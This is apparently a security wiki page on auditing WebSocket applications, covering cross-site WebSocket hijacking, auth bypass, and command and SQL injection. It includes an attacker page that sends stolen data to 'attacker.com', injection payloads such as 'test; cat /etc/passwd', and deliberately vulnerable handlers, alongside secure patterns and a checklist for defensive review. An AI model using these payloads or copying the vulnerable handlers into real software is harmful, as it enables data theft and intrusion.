---
title: WebSocket command injection
slug: websocket-command-injection
aliases: [websocket-attacks, cswsh, websocket-hijacking]
---

> **TL;DR:** WebSocket endpoints often skip the auth and input validation applied to REST routes. Audit the upgrade handshake for missing Origin checks (CSWSH), trace message handlers for command injection sinks, and check whether authentication is enforced per-message or only at connection time.

## What it is
WebSocket-based attacks exploit the persistent, bidirectional nature of WS connections. Developers frequently protect HTTP endpoints with middleware (CSRF, auth, input validation) but wire WebSocket handlers directly to backend logic with minimal checks. From source, you can see exactly what validation — if any — sits between the `onMessage` handler and dangerous sinks.

## Preconditions / where it applies
- Application uses WebSocket (or Socket.IO, ActionCable, Phoenix Channels) for real-time features
- Whitebox access to both the WS server handler and the client-side JS
- Related to [[session-hijacking-from-source]] — WS often inherits the HTTP session cookie

## Cross-Site WebSocket Hijacking (CSWSH)

WebSocket connections start as an HTTP `Upgrade` request. The browser sends cookies automatically — just like a regular request. If the server doesn't validate the `Origin` header, any page can open a WS connection as the victim.

**Vulnerable server (no Origin check):**

```javascript
// Node.js ws library
const wss = new WebSocket.Server({ server });
wss.on('connection', (ws, req) => {
    // VULNERABLE — no Origin validation
    // Any page can connect and receive data as the authenticated user
    const session = parseCookie(req.headers.cookie);
    ws.user = lookupUser(session);
    ws.on('message', (msg) => handleMessage(ws, msg));
});
```

**Attacker page (CSWSH exploit):**

```html
<script>
// Victim visits this page while logged in to the target app
const ws = new WebSocket('wss://target.com/ws');
ws.onmessage = function(event) {
    // Exfiltrate data the victim's session can access
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(event.data));
};
ws.onopen = function() {
    // Send commands as the victim
    ws.send(JSON.stringify({action: 'get_profile'}));
};
</script>
```

**Secure pattern:**

```javascript
wss.on('connection', (ws, req) => {
    const origin = req.headers.origin;
    const allowed = ['https://app.example.com'];
    if (!allowed.includes(origin)) {
        ws.close(1008, 'Origin not allowed');
        return;
    }
    // proceed
});
```

**Grep patterns:** Search the WS server setup for `origin`, `Origin`, `allowedOrigins`. Absence = likely vulnerable to CSWSH.

## Authentication bypass via WS upgrade

Some apps authenticate the initial HTTP upgrade but never re-verify. If the session expires or is revoked, the WS connection stays alive.

```python
# Django Channels — VULNERABLE pattern
class ChatConsumer(WebsocketConsumer):
    def connect(self):
        # Auth checked only once at connection time
        if self.scope['user'].is_authenticated:
            self.accept()

    def receive(self, text_data):
        # No re-auth check — user might have been deactivated/logged out
        data = json.loads(text_data)
        self.handle_command(data)  # Still processes commands
```

**What to look for:**
- Auth check only in `connect`/`onOpen`, not in `receive`/`onMessage`
- No session validity check per message
- No connection timeout or periodic re-auth

## Command injection through WebSocket messages

WS message handlers frequently pass user input directly to system commands, especially in admin panels, CI/CD dashboards, and DevOps tools.

```javascript
// Node.js — VULNERABLE: message passed to shell
ws.on('message', (msg) => {
    const data = JSON.parse(msg);
    if (data.action === 'deploy') {
        // Command injection: data.branch = "; id; #"
        exec(`git checkout ${data.branch} && ./deploy.sh`, (err, stdout) => {
            ws.send(stdout);
        });
    }
});
```

```python
# Python — VULNERABLE: subprocess with shell=True
async def receive(self, text_data):
    data = json.loads(text_data)
    if data['type'] == 'run_test':
        # Injection: data['test_name'] = "test; cat /etc/passwd"
        result = subprocess.run(
            f"pytest {data['test_name']}", shell=True, capture_output=True
        )
        await self.send(result.stdout.decode())
```

**Grep patterns in WS handlers:** `exec(`, `spawn(`, `system(`, `subprocess`, `shell=True`, `os.popen`, `Process.Start`, backtick execution.

## SQL injection via WebSocket

Same principle — WS messages bypass the ORM/parameterized query habits applied to REST controllers.

```javascript
ws.on('message', async (msg) => {
    const { action, query } = JSON.parse(msg);
    if (action === 'search') {
        // VULNERABLE — string concatenation in SQL
        const results = await db.query(`SELECT * FROM products WHERE name LIKE '%${query}%'`);
        ws.send(JSON.stringify(results));
    }
});
```

## Message format injection

Some WS protocols use custom text formats where delimiters can be injected.

```python
# Protocol: "ACTION|PARAM1|PARAM2"
def receive(self, text_data):
    parts = text_data.split('|')
    action = parts[0]
    # Injection: "CHAT|hello|ADMIN_CMD|delete_all"
    # If the parser doesn't validate part count, ADMIN_CMD is processed
    if action == 'ADMIN_CMD':
        self.admin_action(parts[1])
```

## Socket.IO specific issues

Socket.IO adds event-based routing on top of WebSocket. Each event name maps to a handler — and the handler list is often not audited.

```javascript
// VULNERABLE — unprotected admin event
io.on('connection', (socket) => {
    socket.on('admin:delete_user', (userId) => {
        // No auth check — any connected user can emit this event
        User.destroy({ where: { id: userId } });
    });

    socket.on('admin:run_query', (sql) => {
        // SQLi via Socket.IO event
        db.query(sql).then(r => socket.emit('result', r));
    });
});
```

**Audit approach:** List every `socket.on('event_name', ...)` and verify each has auth middleware. Socket.IO supports namespace/room middleware:

```javascript
// SECURE — middleware on admin namespace
const adminNs = io.of('/admin');
adminNs.use((socket, next) => {
    if (isAdmin(socket.handshake.auth.token)) return next();
    next(new Error('Unauthorized'));
});
```

## Whitebox WebSocket audit checklist
1. Is the `Origin` header validated on upgrade? (CSWSH)
2. Is authentication enforced per-message or only at connection?
3. Do message handlers pass input to shell/SQL/eval sinks?
4. Are Socket.IO/ActionCable event handlers individually auth-gated?
5. Does the connection have an idle timeout or re-auth interval?
6. Is message format validated (JSON schema, length limits)?
7. Can an unauthenticated user complete the WS handshake at all?

## References
- [[session-hijacking-from-source]] — WS connections inherit HTTP session cookies
- [[xss-from-source-review]] — XSS can be used to open attacker-controlled WS connections
- [[oswe-exploit-scripting-guide]] — scripting WS-based exploits with `websocket-client`
- [PortSwigger — WebSocket vulnerabilities](https://portswigger.net/web-security/websockets) — labs and methodology
- [OWASP Testing Guide — WebSockets](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets) — WSTG-CLNT-10
